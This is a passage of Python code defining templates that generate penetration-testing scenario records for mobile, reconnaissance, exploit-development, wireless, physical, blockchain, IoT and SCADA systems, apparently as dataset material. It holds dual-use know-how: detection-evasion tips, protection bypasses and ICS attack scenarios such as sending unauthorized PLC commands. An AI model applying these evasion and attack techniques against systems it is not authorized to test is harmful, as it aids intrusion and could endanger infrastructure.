# Specialized Template Functions for generate_comprehensive_dataset.py
# Insert these methods into the ComprehensiveDatasetGenerator class after _generate_generic_scenario

def _generate_mobile_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate mobile security scenario (Android/iOS)"""
    platform = "android" if "android" in category else "ios"

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform=platform,
        mitre_attack_ids=["T1437", "T1575"],  # Application Layer Protocol, Native API
        owasp_category="M1",  # OWASP Mobile - Improper Platform Usage
        cve_references=[],
        context=f"You are conducting authorized mobile application security testing of a {platform.upper()} app. Testing focuses on {topic}. Written authorization obtained from app owner.",
        objective=f"Identify and exploit {topic} vulnerabilities in {platform.upper()} application",
        constraints=[
            "Authorized testing with app owner permission",
            "Within approved testing scope",
            "No production user data access",
            "Document all findings"
        ],
        approach=f"Systematic {platform.upper()} app security assessment for {topic}",
        steps=[
            f"1. Extract and decompile {platform.upper()} application package",
            f"2. Analyze app manifest and permissions for {topic}",
            "3. Set up mobile testing environment (emulator or physical device)",
            "4. Configure proxy to intercept mobile traffic",
            f"5. Identify {topic} attack vectors",
            "6. Test exploitation techniques",
            "7. Verify security impact",
            "8. Document proof-of-concept",
            "9. Test on multiple OS versions if applicable",
            "10. Report findings with remediation guidance"
        ],
        tools_required=["Frida" if platform == "android" else "Objection", "Burp Suite", "MobSF"],
        tools_descriptions={
            "Frida" if platform == "android" else "Objection": f"{'Dynamic instrumentation toolkit for Android. Hook into running apps, bypass root detection, SSL pinning. Essential for runtime mobile app analysis' if platform == 'android' else 'Runtime mobile exploration toolkit built on Frida. Bypass jailbreak detection, SSL pinning, explore app internals on iOS'}.",
            "Burp Suite": "Web proxy for intercepting mobile app traffic. Configure mobile device to use Burp as proxy, install Burp CA certificate on device. Essential for API testing.",
            "MobSF": "Mobile Security Framework - automated static and dynamic analysis tool. Analyzes APK/IPA files for security issues, provides detailed reports on vulnerabilities."
        },
        detection_risks=f"{'Low to Moderate. App may have root/jailbreak detection' if platform == 'android' else 'Moderate to High. iOS apps often have jailbreak detection and SSL pinning'}. API calls logged server-side.",
        evasion_techniques=[
            f"{'Bypass root detection using Magisk Hide or Frida scripts' if platform == 'android' else 'Use checkra1n jailbreak or bypass jailbreak detection with Frida'}",
            "Bypass SSL pinning with Frida scripts or proxy tools",
            "Use VPN to hide testing origin if authorized",
            "Test on older OS versions with fewer protections"
        ],
        alternative_methods=[
            "Static analysis of decompiled code",
            "Dynamic analysis with instrumentation",
            "API fuzzing through intercepted traffic",
            "Reverse engineering of native libraries"
        ],
        explanation=f"""**{topic} on {platform.upper()} Applications**

Mobile applications present unique security challenges due to offline storage, device APIs, and platform-specific security models.

**Mobile Testing Methodology:**
1. Static Analysis (decompilation, manifest review)
2. Dynamic Analysis (runtime hooking, API interception)
3. Network Analysis (traffic interception, API testing)
4. Reverse Engineering (native code analysis)

**Authorization:**
All testing conducted with explicit written authorization from app owner. Testing limited to approved scope.""",
        common_mistakes=[
            "Testing without proper authorization",
            "Not testing on multiple OS versions",
            "Missing hardcoded secrets in decompiled code",
            "Failing to test offline functionality",
            "Not checking for insecure data storage"
        ],
        defensive_countermeasures=[
            "Implement certificate pinning",
            "Use secure local storage (Keychain/KeyStore)",
            "Implement jailbreak/root detection",
            "Obfuscate sensitive code",
            "Validate all input from untrusted sources",
            "Use platform security features properly",
            "Regular security testing and code review",
            "Keep third-party libraries updated"
        ]
    )

def _generate_recon_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate reconnaissance scenario"""
    is_passive = "passive" in category

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="network",
        mitre_attack_ids=["T1595" if not is_passive else "T1593"],  # Active vs Passive Scanning
        owasp_category=None,
        cve_references=[],
        context=f"You are conducting authorized {'passive' if is_passive else 'active'} reconnaissance as part of security assessment. Focus on {topic}. Written authorization obtained.",
        objective=f"Gather intelligence about target using {'passive' if is_passive else 'active'} {topic} techniques",
        constraints=[
            "Authorized testing with written permission",
            f"{'No direct target interaction' if is_passive else 'Within approved scanning parameters'}",
            "Document all sources and findings",
            "Respect rate limits and legal boundaries"
        ],
        approach=f"{'OSINT' if is_passive else 'Active scanning'} methodology for {topic}",
        steps=[
            f"1. Define reconnaissance scope for {topic}",
            f"2. {'Search public sources for target information' if is_passive else 'Configure scanning tools with authorized parameters'}",
            f"3. {'Gather data from search engines, DNS, WHOIS' if is_passive else 'Perform port scanning and service enumeration'}",
            "4. Identify potential attack surface",
            "5. Document discovered assets and services",
            "6. Correlate findings for attack planning",
            "7. Generate reconnaissance report",
            "8. Identify high-value targets",
            "9. Map out network topology if applicable",
            "10. Present findings with security recommendations"
        ],
        tools_required=["Recon-ng" if is_passive else "nmap", "theHarvester" if is_passive else "masscan", "Shodan"],
        tools_descriptions={
            "Recon-ng" if is_passive else "nmap": f"{'Web reconnaissance framework with modules for OSINT gathering. Automates information collection from public sources' if is_passive else 'Network exploration tool. Use -sV for service detection, -sC for default scripts, -p- for all ports. Essential for active reconnaissance'}.",
            "theHarvester" if is_passive else "masscan": f"{'Email and subdomain harvesting tool. Searches search engines, PGP servers, Shodan. Great for passive information gathering' if is_passive else 'Fast port scanner for large networks. Can scan entire Internet in under 6 minutes. Use carefully with rate limiting'}.",
            "Shodan": "Search engine for Internet-connected devices. Find exposed services, vulnerable systems, misconfigured devices. Useful for both passive and active reconnaissance."
        },
        detection_risks=f"{'Very Low. Passive reconnaissance leaves no traces on target' if is_passive else 'Moderate to High. Active scanning triggers IDS/IPS alerts and appears in logs'}. Use stealth techniques if authorized.",
        evasion_techniques=[
            f"{'Use public proxies or VPNs for OSINT queries' if is_passive else 'Slow scan timing (-T2) to avoid detection'}",
            f"{'Rotate search queries and IP addresses' if is_passive else 'Fragment packets and randomize scan order'}",
            "Blend in with normal traffic patterns",
            "Use legitimate services and APIs"
        ],
        alternative_methods=[
            f"{'Social media intelligence (SOCMINT)' if is_passive else 'DNS enumeration and zone transfers'}",
            f"{'Public records and corporate filings' if is_passive else 'Network mapping and topology discovery'}",
            "Certificate transparency logs",
            "Historical data from archives"
        ],
        explanation=f"""**{'Passive' if is_passive else 'Active'} Reconnaissance - {topic}**

Reconnaissance is the first phase of any security assessment. {'Passive recon gathers information without direct target interaction, using publicly available sources' if is_passive else 'Active recon directly interacts with target systems to enumerate services, ports, and vulnerabilities'}.

**Reconnaissance Methodology:**
1. Scope Definition
2. Information Gathering
3. Asset Discovery
4. Vulnerability Identification
5. Attack Surface Mapping

**Authorization:**
All reconnaissance conducted under written authorization with defined scope.""",
        common_mistakes=[
            f"{'Accidentally performing active reconnaissance during passive phase' if is_passive else 'Too aggressive scanning triggering alerts'}",
            "Not documenting sources and timestamps",
            "Missing critical infrastructure in scope",
            "Failing to validate discovered information",
            "Not correlating findings across sources"
        ],
        defensive_countermeasures=[
            "Monitor for reconnaissance activity",
            "Implement rate limiting on public services",
            "Minimize public information exposure",
            "Use honeypots to detect scanning",
            "Regularly audit public-facing assets",
            "Implement proper logging and alerting",
            "Educate employees about social engineering",
            "Monitor for leaked credentials and data"
        ]
    )

def _generate_exploit_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate exploit development scenario"""
    is_advanced = "advanced" in category

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="linux",  # Most exploit dev focuses on Linux
        mitre_attack_ids=["T1203", "T1068"],  # Exploitation for Client Execution, Exploitation for Privilege Escalation
        owasp_category=None,
        cve_references=[],
        context=f"You are conducting authorized exploit development research. Focus on {topic} vulnerability exploitation. This is for security research under written authorization.",
        objective=f"Develop working proof-of-concept exploit for {topic} vulnerability",
        constraints=[
            "Authorized security research only",
            "Responsible disclosure if real vulnerability",
            "Lab environment for testing",
            "Document exploit methodology"
        ],
        approach=f"{'Advanced' if is_advanced else 'Basic'} exploit development for {topic}",
        steps=[
            f"1. Analyze vulnerable binary/application for {topic}",
            "2. Identify exploitation primitive (read/write/execute)",
            "3. Calculate offsets and gadget locations",
            "4. Craft initial exploit payload",
            "5. Test exploit in controlled environment",
            "6. Debug and refine exploit reliability",
            "7. Implement protection bypasses if applicable",
            "8. Create stable working exploit",
            "9. Document exploit technique and prerequisites",
            "10. Report to vendor or bug bounty program"
        ],
        tools_required=["gdb/pwndbg", "ROPgadget" if is_advanced else "pattern_create", "pwntools"],
        tools_descriptions={
            "gdb/pwndbg": "GNU Debugger with pwndbg enhancement. Essential for exploit development. Set breakpoints, examine memory, step through execution. Use 'pattern create' and 'pattern offset' for finding buffer offsets.",
            "ROPgadget" if is_advanced else "pattern_create": f"{'Tool for finding ROP gadgets in binaries. Searches for useful instruction sequences (pop, ret, etc.) for ROP chain construction' if is_advanced else 'Metasploit tool for creating unique patterns to identify exact buffer overflow offset. Use with pattern_offset to find EIP overwrite location'}.",
            "pwntools": "Python CTF framework and exploit development library. Provides utilities for crafting exploits: shellcode generation, ROP chain building, process interaction. Essential for modern exploit development."
        },
        detection_risks=f"{'High. Advanced exploits may trigger EDR/AV heuristics' if is_advanced else 'Moderate. Basic exploits may be detected by AV signatures'}. Test in isolated environment.",
        evasion_techniques=[
            f"{'Polymorphic shellcode and ROP chain randomization' if is_advanced else 'Encode shellcode to avoid signature detection'}",
            f"{'Heap spray and memory massaging techniques' if is_advanced else 'NOP sled for reliability'}",
            "Use position-independent shellcode",
            "Avoid known bad characters"
        ],
        alternative_methods=[
            f"{'Heap exploitation techniques' if is_advanced else 'Stack-based overflow variations'}",
            f"{'Type confusion attacks' if is_advanced else 'Format string vulnerabilities'}",
            "Integer overflow exploitation",
            "Use-after-free exploitation"
        ],
        explanation=f"""**{topic} Exploitation {'(Advanced)' if is_advanced else '(Basic)'}**

Exploit development is the art of turning software vulnerabilities into working exploits. {'Advanced exploitation requires bypassing modern protections like ASLR, DEP, and stack canaries' if is_advanced else 'Basic exploitation focuses on understanding memory corruption and control flow hijacking'}.

**Exploit Development Process:**
1. Vulnerability Analysis
2. Crash Analysis
3. Exploitation Primitive Discovery
4. Payload Development
5. Protection Bypass
6. Reliability Engineering

**Authorization:**
All exploit development for authorized security research. Responsible disclosure practices followed.""",
        common_mistakes=[
            f"{'Not accounting for ASLR/DEP protections' if is_advanced else 'Not identifying bad characters in shellcode'}",
            "Exploit only works on specific version/environment",
            "Unreliable exploit due to race conditions",
            "Not testing on multiple system configurations",
            f"{'Missing ret2libc or ROP chain errors' if is_advanced else 'Incorrect buffer offset calculation'}"
        ],
        defensive_countermeasures=[
            "Enable ASLR, DEP/NX, stack canaries",
            "Use compiler protections (-fstack-protector, -D_FORTIFY_SOURCE)",
            "Regular security updates and patching",
            "Sandboxing and privilege separation",
            "Memory-safe programming languages when possible",
            "Code review and static analysis",
            "Fuzzing and dynamic testing",
            "Control Flow Integrity (CFI) and other modern protections"
        ]
    )

def _generate_wireless_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate wireless security scenario (Wi-Fi, Bluetooth, RFID)"""

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="wireless",
        mitre_attack_ids=["T1200", "T1557"],  # Hardware Additions, MITM
        owasp_category=None,
        cve_references=[],
        context=f"You are conducting authorized wireless security assessment. Focus on {topic}. Written authorization obtained from network owner.",
        objective=f"Assess wireless network security for {topic} vulnerabilities",
        constraints=[
            "Authorized testing with written permission",
            "Within approved physical location",
            "No disruption to legitimate users",
            "Document all activities and findings"
        ],
        approach=f"Wireless security testing methodology for {topic}",
        steps=[
            "1. Set up wireless testing equipment and put adapter in monitor mode",
            f"2. Scan for wireless networks and identify {topic} targets",
            "3. Capture wireless traffic for analysis",
            "4. Identify security weaknesses in wireless configuration",
            "5. Test authentication and encryption mechanisms",
            "6. Attempt authorized exploitation",
            "7. Document security findings and evidence",
            "8. Test for rogue access points",
            "9. Analyze captured handshakes or traffic",
            "10. Report findings with remediation recommendations"
        ],
        tools_required=["aircrack-ng", "Wireshark", "Kismet"],
        tools_descriptions={
            "aircrack-ng": "Complete suite of wireless security tools. Use airmon-ng for monitor mode, airodump-ng for capture, aireplay-ng for packet injection, aircrack-ng for cracking. Essential for Wi-Fi security testing.",
            "Wireshark": "Network protocol analyzer. Captures and analyzes wireless traffic. Use display filters for 802.11 frames, decrypt WPA traffic with keys. Essential for understanding wireless protocols.",
            "Kismet": "Wireless network detector, sniffer, and intrusion detection system. Passively captures 802.11 traffic, identifies hidden SSIDs, detects rogue APs. Works with various wireless cards."
        },
        detection_risks="Low to Moderate. Passive monitoring is undetectable. Active attacks (deauth, injection) may alert IDS. Legitimate network admins can see unusual traffic patterns.",
        evasion_techniques=[
            "Use passive monitoring when possible",
            "Perform testing during low-traffic periods",
            "Use different MAC addresses for different attacks",
            "Blend attacks with normal client behavior"
        ],
        alternative_methods=[
            "Evil twin access point attacks",
            "WPS PIN attacks",
            "PMKID attacks for WPA/WPA2",
            "Client-side attacks through malicious APs"
        ],
        explanation=f"""**Wireless Security - {topic}**

Wireless networks present unique security challenges due to broadcast nature, physical access requirements, and encryption implementations.

**Wireless Testing Methodology:**
1. Reconnaissance (passive/active scanning)
2. Traffic capture and analysis
3. Authentication testing
4. Encryption analysis
5. Client attacks
6. Rogue AP detection

**Authorization:**
All wireless testing conducted with explicit written authorization from network owner. Testing confined to authorized physical locations.""",
        common_mistakes=[
            "Testing without proper authorization",
            "Not putting adapter in monitor mode correctly",
            "Disrupting production wireless networks",
            "Missing hidden SSIDs",
            "Not testing all wireless protocols (2.4GHz, 5GHz, Bluetooth)"
        ],
        defensive_countermeasures=[
            "Use WPA3 with strong passphrases",
            "Disable WPS entirely",
            "Implement 802.1X/RADIUS authentication",
            "Use client isolation",
            "Monitor for rogue access points",
            "Implement wireless IDS/IPS",
            "Regular security audits",
            "MAC address filtering (as additional layer)"
        ]
    )

def _generate_physical_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate physical security scenario (USB attacks, hardware implants)"""

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="physical",
        mitre_attack_ids=["T1200", "T1091"],  # Hardware Additions, Replication Through Removable Media
        owasp_category=None,
        cve_references=[],
        context=f"You are conducting authorized physical security assessment. Focus on {topic}. Written authorization obtained for physical testing.",
        objective=f"Assess physical security controls against {topic} threats",
        constraints=[
            "Authorized physical access testing only",
            "Within approved facilities and areas",
            "No damage to equipment",
            "Document all physical access attempts"
        ],
        approach=f"Physical security testing for {topic}",
        steps=[
            "1. Identify physical access points and controls",
            f"2. Prepare {topic} testing equipment",
            "3. Test physical security controls and monitoring",
            "4. Attempt authorized physical exploitation",
            "5. Assess detection and response capabilities",
            "6. Document bypass techniques",
            "7. Test with different attack vectors",
            "8. Verify security camera and alarm coverage",
            "9. Assess social engineering opportunities",
            "10. Report findings with physical security recommendations"
        ],
        tools_required=["USB Rubber Ducky", "Bash Bunny", "Flipper Zero"],
        tools_descriptions={
            "USB Rubber Ducky": "Keystroke injection tool disguised as USB drive. Executes pre-programmed payloads when plugged in. Uses DuckyScript language. Essential for USB-based attacks and payload delivery.",
            "Bash Bunny": "Multi-function USB attack platform. Can emulate keyboards, network adapters, storage. Supports multiple attack modes. More versatile than Rubber Ducky for complex attacks.",
            "Flipper Zero": "Portable multi-tool for pentesters. RFID/NFC cloning, IR remote control, SubGHz radio, BadUSB, GPIO access. Swiss Army knife for hardware hacking."
        },
        detection_risks="Moderate to High. Physical access attempts logged. Security cameras capture activity. USB device insertion may trigger EDR alerts. Social engineering attempts may be reported.",
        evasion_techniques=[
            "Use legitimate-looking USB devices",
            "Time attacks during busy periods",
            "Develop cover stories for social engineering",
            "Avoid security camera line of sight when possible"
        ],
        alternative_methods=[
            "Social engineering for physical access",
            "Tailgating through secure doors",
            "Badge cloning and replay",
            "Lock picking and bypass"
        ],
        explanation=f"""**Physical Security - {topic}**

Physical security is often the weakest link in organizational security. {topic} attacks leverage physical access to compromise digital systems.

**Physical Testing Methodology:**
1. Reconnaissance of physical controls
2. Identification of weak points
3. Testing of access controls
4. Social engineering assessment
5. Hardware attack vectors
6. Detection and response evaluation

**Authorization:**
All physical security testing conducted with explicit written authorization. Testing confined to approved facilities and time windows.""",
        common_mistakes=[
            "Testing without proper authorization documentation",
            "Causing damage to locks or equipment",
            "Not considering camera surveillance",
            "Underestimating security guard vigilance",
            "Failing to document attempted access methods"
        ],
        defensive_countermeasures=[
            "Implement multi-factor authentication for physical access",
            "Use security cameras with motion detection",
            "Disable USB ports or use endpoint protection",
            "Train employees on social engineering",
            "Implement visitor management systems",
            "Use tamper-evident seals on equipment",
            "Regular physical security audits",
            "Implement badge access logs and alerts"
        ]
    )

def _generate_blockchain_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate blockchain security scenario (smart contracts, DeFi)"""

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="blockchain",
        mitre_attack_ids=["T1212", "T1190"],  # Exploitation for Credential Access, Exploit Public-Facing Application
        owasp_category=None,
        cve_references=[],
        context=f"You are conducting authorized blockchain security audit. Focus on {topic} in smart contracts. Written authorization obtained from project owner.",
        objective=f"Identify and demonstrate {topic} vulnerabilities in smart contracts",
        constraints=[
            "Authorized smart contract audit only",
            "Testing on testnet unless explicitly authorized",
            "No unauthorized fund transfers",
            "Responsible disclosure of vulnerabilities"
        ],
        approach=f"Smart contract security assessment for {topic}",
        steps=[
            "1. Review smart contract source code and documentation",
            f"2. Identify potential {topic} vulnerabilities",
            "3. Set up local blockchain testing environment",
            "4. Deploy contract to testnet for testing",
            "5. Develop proof-of-concept exploit",
            "6. Test exploit in controlled environment",
            "7. Verify economic impact of vulnerability",
            "8. Document attack vectors and scenarios",
            "9. Test with different transaction patterns",
            "10. Report findings with remediation code"
        ],
        tools_required=["Slither", "Mythril", "Hardhat"],
        tools_descriptions={
            "Slither": "Static analysis framework for Solidity smart contracts. Detects reentrancy, integer overflow, access control issues. Fast and accurate for finding common vulnerabilities.",
            "Mythril": "Security analysis tool for EVM bytecode. Symbolic execution engine finds complex vulnerabilities. Can detect reentrancy, integer overflow, and many other issues.",
            "Hardhat": "Ethereum development environment. Used for testing smart contracts locally, debugging, and deploying. Essential for smart contract development and testing."
        },
        detection_risks="Low for testnet testing. High if exploiting mainnet contracts. All blockchain transactions are public and permanent. Exploit attempts visible on block explorers.",
        evasion_techniques=[
            "Test on private/local blockchain first",
            "Use testnet for proof-of-concept",
            "Create new addresses for testing",
            "Understand gas costs and transaction ordering"
        ],
        alternative_methods=[
            "Flash loan attacks for capital-free exploitation",
            "Front-running and sandwich attacks",
            "Oracle manipulation",
            "Cross-contract interactions"
        ],
        explanation=f"""**Blockchain Security - {topic}**

Smart contracts are immutable programs on blockchain. Vulnerabilities can lead to permanent fund loss. {topic} is a critical security consideration in DeFi protocols.

**Smart Contract Audit Methodology:**
1. Code review and static analysis
2. Dynamic testing on testnet
3. Economic analysis of vulnerabilities
4. Formal verification when possible
5. Attack scenario modeling
6. Responsible disclosure

**Authorization:**
All smart contract testing conducted with project owner authorization. Mainnet testing only with explicit approval and safeguards.""",
        common_mistakes=[
            "Testing on mainnet without authorization",
            "Not understanding gas mechanics",
            "Missing complex state interactions",
            "Failing to consider front-running",
            "Not testing with realistic economic values"
        ],
        defensive_countermeasures=[
            "Implement checks-effects-interactions pattern",
            "Use reentrancy guards",
            "Implement proper access controls",
            "Add emergency pause functionality",
            "Use upgradeable proxy patterns carefully",
            "Conduct thorough audits before deployment",
            "Implement time locks for critical operations",
            "Monitor contract activity post-deployment"
        ]
    )

def _generate_iot_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate IoT/embedded systems security scenario"""

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="embedded",
        mitre_attack_ids=["T1542", "T1195"],  # Pre-OS Boot, Supply Chain Compromise
        owasp_category=None,  # IoT-specific, not web-based
        tools_required=["binwalk", "Ghidra", "minicom", "OpenOCD"],
        tools_descriptions={
            "binwalk": "Firmware analysis tool for searching binary images for embedded files and executable code. Essential for firmware extraction and analysis. Usage: binwalk -e firmware.bin (extract embedded files), binwalk --signature firmware.bin (identify file types)",
            "Ghidra": "NSA's free software reverse engineering framework. Supports multiple architectures including ARM, MIPS, PowerPC common in IoT. Features decompiler, debugger, and scripting. Critical for analyzing extracted firmware binaries.",
            "minicom": "Serial communication program for accessing UART interfaces on embedded devices. Used for bootloader access and debug console interaction. Configure baud rate (typically 115200) and connect to /dev/ttyUSB0 or similar.",
            "OpenOCD": "Open On-Chip Debugger providing debugging, in-system programming and boundary-scan testing for embedded targets. Interfaces with JTAG/SWD for firmware extraction and runtime analysis."
        },
        context=f"You have written authorization to perform security assessment of IoT device targeting {topic}. Device owner has provided physical access and expects thorough hardware/firmware analysis following responsible disclosure.",
        objective=f"Perform comprehensive IoT security assessment focusing on {topic}, including firmware extraction, vulnerability identification, and exploitation of embedded system weaknesses. Document all findings for remediation.",
        steps=[
            f"1. Perform physical reconnaissance of IoT device for {topic}",
            "2. Identify debug interfaces (UART, JTAG, SWD) using multimeter/logic analyzer",
            "3. Connect to serial console (UART) to access bootloader/debug output",
            "4. Extract firmware using hardware interface or OTA update interception",
            "5. Analyze firmware with binwalk to identify filesystem and binaries",
            "6. Extract and mount filesystem (squashfs, jffs2, cramfs common)",
            "7. Reverse engineer critical binaries with Ghidra (ARM/MIPS architectures)",
            "8. Identify vulnerabilities: hardcoded credentials, backdoors, buffer overflows",
            "9. Test exploitation via network services or hardware debug interface",
            "10. Document attack chain and provide remediation recommendations"
        ],
        explanation=f"""**IoT Security Assessment: {topic}**

**Authorization Context:**
This assessment is conducted with explicit written permission from the device owner/manufacturer. IoT security testing requires physical device access and may involve invasive techniques including hardware modification. All testing follows coordinated disclosure timelines.

**IoT Attack Surface:**
- **Hardware Layer**: UART/JTAG debug ports, SPI/I2C bus access, chip-off techniques
- **Firmware Layer**: Bootloader security, kernel vulnerabilities, filesystem analysis
- **Application Layer**: Web interfaces, mobile apps, cloud APIs
- **Network Layer**: Wireless protocols (Wi-Fi, Bluetooth, Zigbee), network services
- **Supply Chain**: Third-party components, outdated libraries, vendor backdoors

**Common IoT Vulnerabilities:**
1. **Hardcoded Credentials**: Default passwords in firmware, backdoor accounts
2. **Insecure Updates**: Unsigned firmware, no rollback protection, MitM vulnerable
3. **Debug Interfaces**: UART/JTAG accessible without authentication
4. **Memory Corruption**: Buffer overflows in network services (embedded web servers)
5. **Insecure Protocols**: Telnet, FTP, unencrypted MQTT/CoAP
6. **Poor Cryptography**: Weak keys, custom crypto, keys in firmware

**Firmware Extraction Methods:**
- **UART/Serial**: Interrupt boot process, access bootloader, dump flash
- **JTAG/SWD**: Direct memory read via debug interface (requires pin identification)
- **SPI Flash**: Desolder/clip flash chip, read with programmer (most reliable)
- **OTA Interception**: MitM firmware update, download from vendor servers

**Responsible Disclosure:**
Report findings to manufacturer with 90-day disclosure timeline. Provide PoC only after patch availability. Consider CERT/CC coordination for critical vulnerabilities affecting multiple vendors.""",
        common_mistakes=[
            "Incorrect UART baud rate causing garbled output",
            "Damaging device during hardware probing/desoldering",
            "Missing architecture detection (ARM vs MIPS) before reversing",
            "Not checking for anti-debugging/anti-tampering mechanisms",
            "Overlooking vendor-specific toolchains and crypto implementations",
            "Failing to document hardware modifications for reproducibility",
            "Disclosing vulnerabilities publicly without vendor notification"
        ],
        defensive_countermeasures=[
            "Disable or secure debug interfaces (UART/JTAG) in production",
            "Implement secure boot with signature verification",
            "Encrypt firmware images and use signed updates only",
            "Remove hardcoded credentials, use device-unique keys",
            "Enable DEP/ASLR on embedded Linux/RTOS platforms",
            "Minimize attack surface - disable unnecessary services",
            "Regular security audits and penetration testing",
            "Implement runtime integrity monitoring",
            "Use hardware security modules (TPM/Secure Element) for key storage"
        ]
    )


def _generate_scada_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate SCADA/ICS security scenario"""

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="linux",
        mitre_attack_ids=["T0883", "T0855", "T0866"],  # ICS: Modify Control Logic, Unauthorized Command Message, Exploitation of Remote Services
        owasp_category=None,  # ICS-specific, not web OWASP
        tools_required=["s7scan", "mbtget", "ics-forensics", "Wireshark"],
        tools_descriptions={
            "s7scan": "Siemens S7 PLC scanner for discovering and fingerprinting S7-300/400/1200/1500 controllers. Identifies CPU type, firmware version, module information. Usage: s7scan -t ${TARGET_IP} (scan single host), s7scan -n ${TARGET_NETWORK}/24 (scan network)",
            "mbtget": "Modbus/TCP client for reading/writing registers and coils on PLCs and RTUs. Essential for interacting with Modbus devices. Usage: mbtget -h ${TARGET_IP} -p 502 -r 40001 -c 10 (read 10 holding registers starting at 40001)",
            "ics-forensics": "ICS protocol analyzer and forensics toolkit supporting Modbus, DNP3, IEC 60870-5-104. Captures and decodes industrial protocol traffic for analysis. Integrates with Wireshark for deep packet inspection.",
            "Wireshark": "Network protocol analyzer with ICS protocol dissectors (Modbus, DNP3, S7, EtherNet/IP, BACnet). Essential for understanding SCADA traffic patterns and identifying anomalies. Use display filters: modbus, dnp3, s7comm"
        },
        context=f"You have authorized access to perform security assessment of SCADA/ICS environment targeting {topic}. Assessment is conducted during scheduled maintenance window with operations team coordination. Safety systems remain active and monitored.",
        objective=f"Conduct ICS security assessment focusing on {topic}, identifying vulnerabilities in industrial control systems, SCADA protocols, and PLCs. Prioritize availability and safety - do not disrupt critical processes.",
        steps=[
            f"1. Conduct passive network reconnaissance for {topic} using ICS traffic capture",
            "2. Identify SCADA protocols in use (Modbus, DNP3, S7, EtherNet/IP, BACnet)",
            "3. Map PLC/RTU/HMI devices and their network topology",
            "4. Fingerprint device types, firmware versions, and configurations",
            "5. Test for unauthenticated access to ICS protocols",
            "6. Analyze protocol traffic for plaintext credentials and commands",
            "7. Test read/write operations on non-critical registers (with ops approval)",
            "8. Identify vulnerable services (telnet, FTP, HTTP, VNC on ICS devices)",
            "9. Assess HMI security: default credentials, vulnerabilities, access control",
            "10. Document findings with safety impact assessment and recommendations"
        ],
        explanation=f"""**SCADA/ICS Security Assessment: {topic}**

**Authorization and Safety Context:**
CRITICAL: ICS security testing requires explicit authorization and operational coordination. Testing must occur during maintenance windows with safety systems monitored. Never perform testing that could:
- Disrupt critical infrastructure operations
- Damage physical equipment or processes
- Endanger human safety
- Violate regulations (NERC CIP, IEC 62443, CFATS)

**ICS Environment Characteristics:**
- **Legacy Systems**: Devices may be 10-20+ years old, no security updates
- **Proprietary Protocols**: Modbus, DNP3, IEC 104, S7comm, CIP (no encryption/auth historically)
- **Real-time Requirements**: Availability and latency critical, patches difficult
- **Air-gap Myth**: Many SCADA systems connected to corporate networks or internet
- **Safety Priority**: Security cannot compromise safety systems (fail-safe)

**Common ICS Protocols:**
1. **Modbus TCP (502)**: Read/write registers, coils - no authentication
2. **DNP3 (20000)**: Power grid SCADA, supports authentication but rarely enabled
3. **S7comm (102)**: Siemens PLCs - program upload/download, start/stop CPU
4. **EtherNet/IP (44818)**: Rockwell/Allen-Bradley PLCs and I/O
5. **BACnet (47808)**: Building automation, HVAC control
6. **IEC 60870-5-104**: European power systems SCADA

**ICS-Specific Vulnerabilities:**
- **No Authentication**: Most industrial protocols lack authentication by design
- **Plaintext Communication**: Commands and data unencrypted, easily MitM'd
- **Default Credentials**: HMIs, engineering workstations use vendor defaults
- **Outdated OS**: Windows XP/7, embedded Linux without patches
- **Physical Access**: Unsecured panels, field devices accessible
- **Engineering Tools**: Step 7, RSLogix accessible without proper access control

**Attack Scenarios:**
1. **PLC Program Modification**: Upload malicious logic to control physical process
2. **Unauthorized Commands**: Send stop/start commands via Modbus/DNP3
3. **HMI Compromise**: Exploit HMI vulnerabilities to manipulate operator displays
4. **MitM Attacks**: Intercept and modify protocol traffic (easy with no encryption)
5. **Denial of Service**: Flood PLCs with requests, crash HMI software
6. **Data Exfiltration**: Extract process data, intellectual property, configurations

**Responsible Testing:**
- Coordinate with operations, engineering, safety teams
- Use read-only operations unless write explicitly approved
- Test on non-critical systems first (test bench if available)
- Have rollback plan (PLC backups, known-good configurations)
- Monitor for unintended consequences during testing
- Follow coordinated disclosure for vendor vulnerabilities""",
        common_mistakes=[
            "Testing production systems without operational coordination",
            "Writing to PLC registers without understanding process impact",
            "Not having emergency stop procedures documented",
            "Assuming air-gapped systems are actually isolated",
            "Misidentifying protocol (Modbus RTU vs TCP, DNP3 serial vs TCP)",
            "Causing controller faults or safety system trips",
            "Not documenting baseline configurations before testing",
            "Disclosing ICS vulnerabilities without considering critical infrastructure impact"
        ],
        defensive_countermeasures=[
            "Implement network segmentation (Purdue Model: Zones 0-4)",
            "Deploy ICS-aware firewalls and DMZs between zones",
            "Enable protocol authentication where supported (DNP3 SA, IEC 62351)",
            "Use encrypted VPNs for remote access (no direct internet exposure)",
            "Implement IDS/IPS with ICS protocol awareness (e.g., Nozomi, Claroty)",
            "Disable unnecessary protocols and services on ICS devices",
            "Change all default credentials on HMIs, PLCs, switches",
            "Implement role-based access control (RBAC) for engineering workstations",
            "Regular security assessments following ISA/IEC 62443 framework",
            "Maintain offline backups of PLC programs and configurations",
            "Security monitoring and anomaly detection for ICS traffic"
        ]
    )


def _generate_foundations_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate security foundations/methodology scenario"""

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
